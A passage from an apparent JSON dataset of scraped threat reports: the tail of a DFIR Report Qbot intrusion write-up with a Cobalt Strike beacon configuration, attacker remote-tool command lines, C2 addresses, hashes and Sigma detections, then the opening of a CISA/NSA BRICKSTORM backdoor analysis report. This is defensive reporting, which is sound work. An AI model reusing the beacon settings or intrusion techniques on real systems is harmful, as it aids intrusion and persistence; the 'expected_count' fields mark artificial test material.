\"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"crypto_scheme\": 0, \"proxy\": { \"type\": null, \"username\": null, \"password\": null, \"behavior\": \"Use IE settings\" }, \"http_post_chunk\": 0, \"uses_cookies\": true, \"post-ex\": { \"spawnto_x86\": \"%windir%\\\\syswow64\\\\WerFault.exe\", \"spawnto_x64\": \"%windir%\\\\sysnative\\\\WerFault.exe\" }, \"process-inject\": { \"allocator\": \"VirtualAllocEx\", \"execute\": [ \"CreateThread\", \"RtlCreateUserThread\", \"CreateRemoteThread\" ], \"min_alloc\": 29879, \"startrwx\": false, \"stub\": \"pJ9URfAanzJA7qnkbuZsgQ==\", \"transform-x86\": [ \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\" ], \"transform-x64\": [ \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\" ], \"userwx\": false }, \"dns-beacon\": { \"dns_idle\": null, \"dns_sleep\": null, \"maxdns\": null, \"beacon\": null, \"get_A\": null, \"get_AAAA\": null, \"get_TXT\": null, \"put_metadata\": null, \"put_output\": null }, \"pipename\": null, \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"stage\": { \"cleanup\": true }, \"ssh\": { \"hostname\": null, \"port\": null, \"username\": null, \"password\": null, \"privatekey\": null } } The remote admin tool named client32.exe (NetSupport Manager) and its associated libraries were dropped on a workstation in the C:\\ProgramData\\MSN Devices directory. The exchanged network traffic was unencrypted and contained the custom user-agent NetSupport Manager/1.3 The threat actor installed and enabled the Atera RMM agent on the domain controller. The MSI installer, named setup_undefined.msi was configured to drop the installation files in the C:\\Program Files\\ATERA Networks\\AteraAgent directory. Atera integrated with another remote admin tool known as \u201c SplashTop \u201c, which it dropped on the file system. Periodic \u2018heartbeat\u2019 process events of Atera were observed: \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageHeartbeat\\AgentPackageHeartbeat.exe\" 84a4a63b-8338-4a34-a73b-5a5958eac32c \"3f9a2c8a-b755-4c69-bae0-587bafff46ed\" agent-api.atera.com/Production 443 or8ixLi90Mf \"heartbeat\" The \u201cSplashtop\u201d remote admin tool was started as a background process. \"C:\\Windows\\TEMP\\SplashtopStreamer3500.exe\" prevercheck /s /i sec_opt=0,confirm_d=0,hidewindow=1 Both remote admin tools allowed the threat actors to persist and obtain remote access to the environment, without relying on RDP. The Atera Agent account used was retained in the host Software registry hive: Exfiltration No exfiltration observed. Impact Sensitive documents (.pdf, .docx) were viewed in a RDP session on the file server using Notepad++ and Wordpad. After this, no further activity from the threat actor was observed. Indicators Atomic ATERA Integrator Login ID cadencefitzp.atrickzx@gmail[.]com DNS Requests www.stanzatextbooks[.]com www.framemymirror[.]com www.coolwick[.]com www.ajparts.co[.]uk incredibletadoba[.]com ibuonisani[.]it gruposolel[.]com foxmotorent[.]com egofit.co[.]uk edifica[.]ro dwm-me[.]com cursosfnn[.]com cemavimx[.]com atlasbar[.]net Qbot C2 IP\u2019s observed in traffic 144[.]202[.]3[.]39:443 67[.]209[.]195[.]198:443 176[.]67[.]56[.]94:443 72[.]252[.]157[.]93:995 90[.]120[.]65[.]153:2078 72[.]252[.]157[.]93:990 86[.]97[.]9[.]190:443 37[.]34[.]253[.]233:443 23[.]111[.]114[.]52:65400 Cobalt Strike 190[.]123[.]44[.]126:443 Qbot C2 IPv4s in registry key 38[.]70[.]253[.]226:2222 182[.]191[.]92[.]203:995 37[.]186[.]54[.]254:995 140[.]82[.]63[.]183:443 41[.]86[.]42[.]158:995 89[.]101[.]97[.]139:443 201[.]145[.]165[.]25:443 173[.]21[.]10[.]71:2222 82[.]41[.]63[.]217:443 73[.]151[.]236[.]31:443 149[.]28[.]238[.]199:443 83[.]110[.]218[.]147:993 86[.]195[.]158[.]178:2222 120[.]61[.]1[.]114:443 140[.]82[.]49[.]12:443 86[.]97[.]9[.]190:443 92[.]132[.]172[.]197:2222 201[.]142[.]177[.]168:443 82[.]152[.]39[.]39:443 45[.]46[.]53[.]140:2222 71[.]24[.]118[.]253:443 45[.]76[.]167[.]26:443 144[.]202[.]2[.]175:995 24[.]55[.]67[.]176:443 125[.]24[.]187[.]183:443 24[.]178[.]196[.]158:2222 187[.]207[.]131[.]50:61202 78[.]101[.]193[.]241:6883 202[.]134[.]152[.]2:2222 103[.]246[.]242[.]202:443 39[.]52[.]41[.]80:995 187[.]251[.]132[.]144:22 72[.]27[.]33[.]160:443 102[.]182[.]232[.]3:995 176[.]67[.]56[.]94:443 201[.]172[.]23[.]68:2222 37[.]34[.]253[.]233:443 94[.]26[.]122[.]9:995 5[.]32[.]41[.]45:443 96[.]37[.]113[.]36:993 93[.]48[.]80[.]198:995 148[.]64[.]96[.]100:443 39[.]44[.]158[.]215:995 67[.]69[.]166[.]79:2222 45[.]63[.]1[.]12:443 31[.]48[.]174[.]63:2078 196[.]203[.]37[.]215:80 144[.]202[.]3[.]39:995 1[.]161[.]101[.]20:443 197[.]164[.]182[.]46:993 144[.]202[.]2[.]175:443 5[.]203[.]199[.]157:995 217[.]165[.]79[.]88:443 120[.]150[.]218[.]241:995 217[.]128[.]122[.]65:2222 85[.]246[.]82[.]244:443 94[.]71[.]169[.]212:995 177[.]205[.]155[.]85:443 79[.]80[.]80[.]29:2222 124[.]40[.]244[.]115:2222 106[.]51[.]48[.]170:50001 94[.]36[.]193[.]176:2222 85[.]255[.]232[.]18:443 89[.]211[.]179[.]247:2222 189[.]253[.]206[.]105:443 69[.]14[.]172[.]24:443 83[.]110[.]92[.]106:443 72[.]252[.]157[.]93:995 208[.]101[.]82[.]0:443 172[.]115[.]177[.]204:2222 174[.]69[.]215[.]101:443 74[.]14[.]5[.]179:2222 140[.]82[.]63[.]183:995 210[.]246[.]4[.]69:995 109[.]12[.]111[.]14:443 148[.]0[.]56[.]63:443 121[.]7[.]223[.]45:2222 47[.]156[.]131[.]10:443 40[.]134[.]246[.]185:995 84[.]241[.]8[.]23:32103 75[.]99[.]168[.]194:443 172[.]114[.]160[.]81:995 75[.]99[.]168[.]194:61201 108[.]60[.]213[.]141:443 217[.]165[.]176[.]49:2222 177[.]156[.]191[.]231:443 32[.]221[.]224[.]140:995 76[.]70[.]9[.]169:2222 111[.]125[.]245[.]116:995 39[.]49[.]96[.]122:995 143[.]0[.]219[.]6:995 67[.]165[.]206[.]193:993 39[.]41[.]29[.]200:995 191[.]112[.]25[.]187:443 41[.]84[.]229[.]240:443 80[.]11[.]74[.]81:2222 144[.]202[.]3[.]39:443 217[.]164[.]121[.]161:1194 89[.]86[.]33[.]217:443 201[.]242[.]175[.]29:2222 31[.]35[.]28[.]29:443 124[.]109[.]35[.]32:995 217[.]164[.]121[.]161:2222 39[.]44[.]213[.]68:995 208[.]107[.]221[.]224:443 24[.]139[.]72[.]117:443 47[.]157[.]227[.]70:443 175[.]145[.]235[.]37:443 63[.]143[.]92[.]99:995 149[.]28[.]238[.]199:995 186[.]90[.]153[.]162:2222 179[.]100[.]20[.]32:32101 190[.]252[.]242[.]69:443 47[.]23[.]89[.]60:993 90[.]120[.]65[.]153:2078 81[.]215[.]196[.]174:443 70[.]46[.]220[.]114:443 76[.]25[.]142[.]196:443 41[.]38[.]167[.]179:995 70[.]51[.]135[.]90:2222 67[.]209[.]195[.]198:443 42[.]228[.]224[.]249:2222 177[.]94[.]57[.]126:32101 104[.]34[.]212[.]7:32103 41[.]230[.]62[.]211:995 177[.]209[.]202[.]242:2222 105[.]27[.]172[.]6:443 46[.]107[.]48[.]202:443 86[.]98[.]149[.]168:2222 173[.]174[.]216[.]62:443 187[.]149[.]236[.]5:443 88[.]224[.]254[.]172:443 45[.]76[.]167[.]26:995 72[.]252[.]157[.]93:993 197[.]89[.]8[.]51:443 41[.]215[.]153[.]104:995 1[.]161[.]101[.]20:995 117[.]248[.]109[.]38:21 179[.]158[.]105[.]44:443 91[.]177[.]173[.]10:995 72[.]252[.]157[.]93:990 45[.]63[.]1[.]12:995 189[.]146[.]90[.]232:443 180[.]129[.]108[.]214:995 Files liidfxngjotktx.dll 5abb2c12f066ce32a0e4866fb5bb347f dab316b8973ecc9a1893061b649443f5358b0e64 077ca8645a27c773d9c881aecf54bc409c2f8445ae8e3e90406434c09ace4bc2 doc532.docx e7015438268464cedad98b1544d643ad 03ef0e06d678a07f0413d95f0deb8968190e4f6b d20120cc046cef3c3f0292c6cbc406fcf2a714aa8e048c9188f1184e4bb16c93 client32.exe f76954b68cc390f8009f1a052283a740 3112a39aad950045d6422fb2abe98bed05931e6c 63315df7981130853d75dc753e5776bdf371811bcfce351557c1e45afdd1ebfb Detections Network ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET POLICY SMB Executable File Transfer ET MALWARE Observed Qbot Style SSL Certificate ET CNC Feodo Tracker Reported CnC Server group 24 ET CNC Feodo Tracker Reported CnC Server group 6 ET HUNTING Observed Let's Encrypt Certificate for Suspicious TLD (.icu) ET INFO NetSupport Remote Admin Checkin ET POLICY HTTP traffic on port 443 (POST) ET POLICY NetSupport GeoLocation Lookup Request ET INFO Splashtop Domain (splashtop .com) in TLS SNI ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET CNC Feodo Tracker Reported CnC Server group 8 ET CNC Feodo Tracker Reported CnC Server group 20 Sigma title: Potential Qbot SMB DLL Lateral Movement id: 3eaa2cee-2dfb-46e9-98f6-3782aab30f38 status: Experimental description: Detection of potential us of SMB to transfer DLL's into the C$ folder of hosts unique to Qbot malware for purposes of lateral movement. author: \\@TheDFIRReport date: 2022/09/12 references: - https://thedfirreport.com/ logsource: product: zeek service: smb_files detection: selection_1: zeek_smb_files_path|endswith: - 'C$' selection_2: file_name|endswith: - '\\.dll.cfg' condition: selection_1 and selection_2 falsepositives: - RMM Tools and Administrative activities in C$ Share. level: medium tags: - attack.lateral_movement - attack.t1570 https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_schtask_creation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_trust_discovery.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbins_by_office_applications.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msdt_susp_parent.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sdiagnhost_susp_child.yml https://github.com/SigmaHQ/sigma/blob/28f8986f7a5767cebf57e5f70d0ea56e29776b83/rules/windows/process_creation/proc_creation_win_schtasks_appdata_local_system.yml https://github.com/SigmaHQ/sigma/blob/8041ab5130ff8f4d44a9fd9454670f329d2727bc/rules/windows/process_creation/proc_creation_win_reg_defender_exclusion.yml https://github.com/SigmaHQ/sigma/blob/329074d935ac81dd91cafdce5e5a43c95cca068d/rules/windows/process_creation/proc_creation_win_esentutl_webcache.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_susp_recon_net_activity.yml https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/application/win_software_atera_rmm_agent_install.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_powershell_frombase64string.yml https://github.com/SigmaHQ/sigma/blob/578c838277fdba88704ff3fed3268e87bd7277e0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml https://github.com/SigmaHQ/sigma/blob/34d16c29dd7d5503e632c8248c44c03c0875e40f/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/c253c57c627b6d8cbcfa06320a3ad1ba2b9dedd4/win_network_splashtop.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/c253c57c627b6d8cbcfa06320a3ad1ba2b9dedd4/win_software_splashtop.yml MITRE System Owner/User Discovery \u2013 T1033 System Network Connections Discovery \u2013 T1049 Domain Groups \u2013 T1069.002 Domain Trust Discovery \u2013 T1482 PowerShell \u2013 T1059.001 Exploitation for Client Execution \u2013 T1203 Regsvr32 \u2013 T1218.010 Scheduled Task/Job \u2013 T1053 Application Layer Protocol \u2013 T1071 Remote Access Software \u2013 T1219 Ingress Tool Transfer \u2013 T1105 Process Injection \u2013 T1055 Disable or Modify Tools \u2013 T1562.001 LSASS Memory \u2013 T1003.001 Credentials from Web Browsers \u2013 T1555.003 Windows Credential Manager \u2013 T1555.004 Remote Desktop Protocol \u2013 T1021.001 Service Execution \u2013 T1569.002 Lateral Tool Transfer \u2013 T1570 S0154 \u2013 Cobalt Strike S0650 \u2013 QakBot S0552 \u2013 AdFind Internal case #14894 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation BumbleBee: Round Two BumbleBee Zeros in on Meterpreter Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 0
  },
  {
    "url": "https://www.cisa.gov/news-events/analysis-reports/ar25-338a",
    "title": "AR25-338A BRICKSTORM Backdoor - Malware Analysis Report",
    "content": "   \nMalware \nAnalysis \nReport \nThis document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries \nminimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject \nto standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information, see \nTraffic Light Protocol (TLP) Definitions and Usage. \nTLP:CLEAR \nBRICKSTORM Backdoor \nInitial Publication: December 4, 2025 \nU.S. Cybersecurity and Infrastructure Security Agency \nU.S. National Security Agency \nCanadian Centre for Cyber Security \n \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 2 of 48 TLP:CLEAR \nMalware Analysis at a Glance \nMalware Name BRICKSTORM \nOriginal Publication Dec. 4, 2025 \nLast Update Feb. 11, 2026 \nExecutive Summary \nThe Cybersecurity and Infrastructure Security Agency (CISA), National Security \nAgency (NSA), and Canadian Centre for Cyber Security (Cyber Centre) assess \nPeople\u2019s Republic of China (PRC) state-sponsored cyber actors are using \nBRICKSTORM malware for long-term persistence on victim systems. CISA, NSA, \nand Cyber Centre are releasing this Malware Analysis Report to share indicators \nof compromise (IOCs) and detection signatures based off analysis of 12 \nBRICKSTORM samples. CISA, NSA, and Cyber Centre urge organizations to use \nthe IOCs and detection signatures to identify BRICKSTORM malware samples. \nLast Update Description \nCISA, NSA, and Cyber Centre updated this Malware Analysis Report on Feb. 11, \n2026, with analysis, IOCs, and detection signatures from a new variant of \nBRICKSTORM. \nKey Actions \n\u25aa Use the IOCs and detection signatures to identify BRICKSTORM samples. \n\u25aa If BRICKSTORM, similar malware, or potentially related activity is detected, \nreport the incident to CISA, Cyber Centre, or required authorities \nimmediately. \nIndicators of \nCompromise \nFor a downloadable copy of IOCs associated with this malware, see:  \n\u25aa MAR-251165.c1.v1.CLEAR (Dec. 4, 2025) \n\u25aa MAR-2512217.c1.v2.CLEAR (Dec. 19, 2025) \n\u25aa MAR-261234.c1.v1.CLEAR (Feb. 11, 2026) \nDetection \nThis Malware Analysis Report includes YARA and Sigma rules. \nFor a downloadable copy of the Sigma rules associated with this malware, see: \nAR25-338A Sigma YAML. \nIntended Audience \nOrganizations: Government and critical infrastructure organizations. \nRoles: Digital forensics analysts, incident responders, vulnerability analysts, \nsystem administrators. \n  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 3 of 48 TLP:CLEAR \nTable of Contents \nIntroduction ................................................................................................................................................................... 4 \nMalware Summary ....................................................................................................................................................... 5 \nMalware Delivery .......................................................................................................................................................... 5 \nMalware Metadata ....................................................................................................................................................... 6 \nMalware Functionality .............................................................................................................................................. 10 \nDetection .................................................................................................................................................................... 22 \nIncident Response ..................................................................................................................................................... 36 \nMitigations .................................................................................................................................................................. 36 \nDisclaimer ................................................................................................................................................................... 37 \nAcknowledgements ................................................................................................................................................... 37 \nVersion History ........................................................................................................................................................... 37 \nAppendix A: MITRE ATT&CK Techniques ............................................................................................................... 38 \nAppendix B: Scanning Guidance on Remote Hosts ............................................................................................. 40 \nAppendix C: Dec. 19, 2025, Updates ..................................................................................................................... 41 \nAppendix D: Feb. 11, 2026, Updates ..................................................................................................................... 45 \nNotes ........................................................................................................................................................................... 48 \n  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 4 of 48 TLP:CLEAR \nIntroduction \nNote: This Malware Analysis Report was originally published Dec. 4, 2025, to share indicators of \ncompromise (IOCs) and detection signatures for BRICKSTORM malware. The Cybersecurity and \nInfrastructure Security Agency (CISA), National Security Agency (NSA), and Canadian Centre for Cyber \nSecurity (Cyber Centre) have updated this Malware Analysis Report three times. \n\u25aa Dec. 19, 2025, with IOCs and detection signatures for three additional BRICKSTORM samples. See \nAppendix C: Dec. 19, 2025, Updates and Table 12. \n\u25aa Jan. 20, 2026, with detection signatures. See Table 12. \n\u25aa Feb. 11, 2026, with analysis, IOCs, and detection signatures for an additional sample of \nBRICKSTORM. This sample is a different variant than the other samples. See Appendix D: Feb. 11, \n2026, Updates and Table 12. \nCISA, NSA, and Cyber Centre assess People\u2019s Republic of China (PRC) state-sponsored cyber actors are \nusing BRICKSTORM malware for long-term persistence on victim systems. Victim organizations are \nprimarily in the Government Services and Facilities and Information Technology Sectors. BRICKSTORM is a \nsophisticated backdoor for VMware vSphere (specifically VMware vCenter servers,1 VMware ESXI,2 and \nVMware Aria Automation Orchestrator) and Windows environments.3  \nThese cyber actors have been observed targeting VMware vSphere platforms. Once compromised, the \ncyber actors can use their access to the vCenter management console to steal cloned virtual machine (VM) \nsnapshots for credential extraction and create hidden, rogue VMs. See CISA\u2019s Alert PRC State-Sponsored \nAPT Actors Employ BRICKSTORM Malware Across Public Sector and Information Technology. \nCISA analyzed 12 BRICKSTORM samples obtained from victim organizations, including an organization \nwhere CISA conducted an incident response engagement. (CISA initially analyzed eight samples. The Dec. \n19, 2025, update includes analysis of three additional samples and the Feb. 11, 2026, update includes \nanalysis of one sample.) \nAt the victim organization where CISA conducted an incident response engagement, PRC state-sponsored \ncyber actors gained long-term persistent access to the organization\u2019s internal network in April 2024 and \nuploaded BRICKSTORM malware to an internal VMware vCenter server. They also gained access to two \ndomain controllers and an Active Directory Federation Services (ADFS) server. They successfully \ncompromised the ADFS server and exported cryptographic keys. The cyber actors used BRICKSTORM for \npersistent access from at least April 2024 through at least Sep. 3, 2025. \nCISA, NSA, and Cyber Centre urge organizations to use the IOCs and detection signatures in this Malware \nAnalysis Report to identify BRICKSTORM malware samples. If identified, follow the guidance in the Incident \nResponse section. \nFor a downloadable copy of IOCs associated with this malware, see:  \n\u25aa MAR-251165.c1.v1.CLEAR (Dec. 4, 2025) \n\u25aa MAR-2512217.c1.v2.CLEAR (Dec. 19, 2025) \n\u25aa MAR-261234.c1.v1.CLEAR (Feb. 11, 2026) \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 5 of 48 TLP:CLEAR \nFor a downloadable copy of the Sigma rule associated with this malware, see: AR25-338A Sigma YAML. \nFor more information on PRC state-sponsored cyber activity, see CISA\u2019s People\u2019s Republic of China Threat \nOverview and Advisories webpage. \nMalware Summary \nBRICKSTORM is a custom Executable and Linkable Format (ELF) Go- or Rust-based backdoor (eight \noriginally analyzed samples are Go-based, and two of the three new samples in the Dec. 19, 2025, update \nare Rust-based). The analyzed samples differ in function, but all enable cyber actors to maintain stealthy \naccess and provide capabilities for initiation, persistence, and secure command and control (C2). Even \nthough the analyzed samples were for VMware vSphere environments, there is reporting about Windows \nversions. \nBRICKSTORM initiates by running checks and maintains persistence by using a self-watching function and \nautomatically reinstalls or restarts if disrupted. \nFor C2, BRICKSTORM uses multiple layers of encryption (HTTPS, WebSockets, nested Transport Layer \nSecurity [TLS]) to hide its communications with the cyber actors\u2019 C2 server. It also uses DNS-over-HTTPS \n(DoH) and mimics web server functionality to blend its communications with legitimate traffic. For remote \nsystem control, BRICKSTORM gives cyber actors interactive shell access on the system and allows them to \nbrowse, upload, download, create, delete, and manipulate files. In addition, some samples act as a SOCKS \nproxy, facilitating lateral movement and allowing cyber actors to compromise additional systems. \nMalware Delivery \nNote: This advisory uses the MITRE ATT&CK\u00ae Matrix for Enterprise framework, version 18. See Appendix A: \nMITRE ATT&CK Techniques for tables mapping the cyber actors\u2019 activity to MITRE ATT&CK tactics and \ntechniques. \nAt the victim organization where CISA conducted an incident response engagement, PRC state-sponsored \ncyber actors accessed a web server on April 11, 2024. The web server was inside the organization\u2019s \ndemilitarized zone (DMZ), and cyber actors accessed it through a web shell [T1505.003] present on the \nserver. Incident data does not indicate how they obtained initial access to the web server or when the web \nshell was implanted. On the same day, the cyber actors used service account credentials [T1078] to move \nlaterally using Remote Desktop Protocol (RDP) [T1021.001] from the web server to a domain controller in \nthe DMZ, from which they copied the Active Directory (AD) database (ntds.dit) [T1003.003]. \nOn April 12, 2024, the cyber actors moved laterally from the web server to a domain controller within the \ninternal network using RDP and credentials associated with a second service account. It is unknown how \nthey obtained the credentials. Subsequently, they copied the AD database, obtaining credentials for a \nmanaged service provider (MSP) account. Using the MSP credentials, the cyber actors proceeded to move \nfrom the internal domain controller to the VMware vCenter server. \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 6 of 48 TLP:CLEAR \nFrom the web server, the actors also moved laterally using Server Message Block (SMB) to two jump \nservers and an ADFS server, from which they exfiltrated cryptographic keys. See Figure 1 for a diagram of \nthe cyber actors\u2019 movement. \n \nFigure 1. PRC State-Sponsored Cyber Actors\u2019 Lateral Movement \nAfter gaining access to vCenter, the cyber actors elevated privileges using the sudo command \n[T1548.003], dropped BRICKSTORM malware in the server\u2019s /etc/sysconfig/ directory [T1105], and \nmodified the system\u2019s init file in /etc/sysconfig/ to run BRICKSTORM. \nThe modified init file controls the bootup process [T1037] on VMware vSphere systems and executes \nBRICKSTORM. Typically, this file is used to define certain visual variables for the bootup process. After the \nsetting for visual variables, an additional line was added to the script to execute BRICKSTORM from the \nhard-coded file path /etc/sysconfig/. \nNote: CISA is still completing analysis to understand the malicious activity and full impact of the \ncompromise. \nMalware Metadata \nSee Table 1 through Table 8 for metadata of the analyzed malware Samples 1 through 8. See Appendix C: \nDec. 19, 2025, Updates for metadata of Samples 9 through 11 and Appendix D: Feb. 11, 2026, Updates \nfor metadata of Sample 12. \nTable 1. BRICKSTORM Sample 1 \nFile Name vmsrc \nSize 7692288 bytes \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 7 of 48 TLP:CLEAR \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 8e4c88d00b6eb46229a1ed7001451320 \nSHA1 9bf4c786ebd68c0181cfe3eb85d2fd202ed12c54 \nSHA256 aaf5569c8e349c15028bc3fac09eb982efb06eabac955b705a6d447263658e38 \nSHA512 5e654776e9c419e11e6f93a452415a601bd9a2079710f1074608570e498a9af37b81bb\n57c98cb8bb626c5ee4b3e35757d3ae8c1c3717f28d9f3fe7a4cebe0608 \nssdeep 49152:9lDeYNeYunc1S3/U05q+CIKUbwgBfd1Vww/uUJSZina/TokDDko0n8oQhEoAgsUJ:O3l\ncE380sIDbdB11p3i/TokEIowlb/r \nEntropy 5.993799 \nTable 2. BRICKSTORM Sample 2 \nFile Name vnetd \nSize 26603668 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 39111508bfde89ce6e0fe6abe0365552 \nSHA1 f639d9404c03af86ce452db5c5e0c528b81dc0d7 \nSHA256 013211c56caaa697914b5b5871e4998d0298902e336e373ebb27b7db30917eaf \nSHA512 74b4c6f7c7cae07c6f8edf3f2fb1e9206d4f1f9734e8e4784b15d192eec8cd8a4f59078fc0\nc56dc4ad0856cdd792337b5c92ffd3d2240c8a287a776df4363bba \nssdeep 196608:GbkKsdDjru3WUIOsW5SYVRk/Qvk1LzK3RMxy2wBW:GwKMjr3Os4k/QiLzERMMdW \nEntropy 6.211446 \nTable 3. BRICKSTORM Sample 3 \nFile Name if-up \nSize 15511700 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 8 of 48 TLP:CLEAR \nMD5 dbca28ad420408850a94d5c325183b28 \nSHA1 fb11c6caa4ea844942fe97f46d7eb42bc76911ab \nSHA256 57bd98dbb5a00e54f07ffacda1fea91451a0c0b532cd7d570e98ce2ff741c21d \nSHA512 659205fa2cfa85e484c091cc2e85a7ec4e332b196e423b1f39bafdc8fca33e3db712bbe07\nafcc091ff26d9b4f641fa9a73f2a66dce9a0ced54ebeb8c2be82a7f \nssdeep 98304:dzB06b0KX4Mnb+sJf+AjBzH3MF4m1d4U2TuAJ5VGY3glknTSk2nH:dFQKIsJBBzXMu\nm83RJ5VGY3gS2nH \nEntropy 6.102490 \nTable 4. BRICKSTORM Sample 4 \nFile Name viocli \nSize 6311936 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 0a4fa52803a389311a9ddc49b7b19138 \nSHA1 97001baaa379bcd83677dca7bc5b8048fdfaaddc \nSHA256 b3b6a992540da96375e4781afd3052118ad97cfe60ccf004d732f76678f6820a \nSHA512 65ebf5dfafb8972ffead44271436ec842517cfaaf3d1f1f1237a32d66e1d280943bd3a69f1\nd539a1b7aca6152e96b29bc822e1047e2243f6aec8959595560147 \nssdeep 49152:BgClz8/9cMSThwhWyh/zypzOzRzqm9hRp6FY+fAn/bkNqr+HfHF2xkdpb3gAiDli:W08/\n9I6WMzUcRz9zvn//Z5D \nEntropy 6.005898 \nTable 5. BRICKSTORM Sample 5 \nFile Name vts \nSize 6303744 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 82bf31e7d768e6d4d3bc7c8c8ef2b358 \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 9 of 48 TLP:CLEAR \nSHA1 de28546ec356c566cd8bca205101a733e9a4a22d \nSHA256 22c15a32b69116a46eb5d0f2b228cc37cd1b5915a91ec8f38df79d3eed1da26b \nSHA512 4c52caf2e5f114103ed5f60c6add3aa26c741b07869bb66e3c25a1dc290d4a8bf87c42c3\n36e8ac8ebf82d9a9b23eaa18c31f7051a5970a8fe1125a2da890340f \nssdeep 49152:uP9kPWdmrJl+9zxKsSJ32ssUZGHZ9ECKDfvCb3XKRbaYJcRHMH9xkdgY3gqF2HxR:yq\nWdmd4x5SgssUZ0OCKDfvChYrRq \nEntropy 6.005438 \nTable 6. BRICKSTORM Sample 6 \nFile Name vmckd \nSize 6311936 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 18f895e24fe1181bb559215ff9cf6ce3 \nSHA1 c3549d4e5e39a11f609fc6fbf5cc1f2c0ec272b4 \nSHA256 f7cda90174b806a34381d5043e89b23ba826abcc89f7abd520060a64475ed506 \nSHA512 79276523a6a507e3fa1b12b96e09b10a01c783a53d58b9ae7f5780a379431639a8016\n5e81154522649b8e2098e86d1a310efffebe32faafc7b3bc093eec60a64 \nssdeep 49152:6XUQ9anktEg7z/QbPB83A+FQGQzqufqCjt2F81jh+eS53OOwJylHJHuxkdqz3gHG:mVa\nnkxn2Pe3JQGQz57t2Y4f3TwrQHAz \nEntropy 6.005752 \nTable 7. BRICKSTORM Sample 7 \nSize 8332689 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 a52e36a70b5e0307cbcaa5fd7c97882c \nSHA1 44a3d3f15ef75d9294345462e1b82272b0d11985 \nSHA256 39b3d8a8aedffc1b40820f205f6a4dc041cd37262880e5030b008175c45b0c46 \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 10 of 48 TLP:CLEAR \nSHA512 bbe18d32bef66ccfa931468511e8ba55b32943e47a1df1e68bb5c8f8ae97a5bf99120185\n8ae9632fa24df5f6c674b6cb260297a1c11889ca61bda68513f440ce \nssdeep 98304:78Se5lqfYMKDdopPx0E4j+dM/GLaCXNwqYL6wt/5APUnb:78Se54fYMUaiE4j+dM/GL\naCXNmLP+ \nEntropy 6.063930 \nTable 8. BRICKSTORM Sample 8 \nSize 8332689 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 a02469742f7b0bc9a8ab5e26822b3fa8 \nSHA1 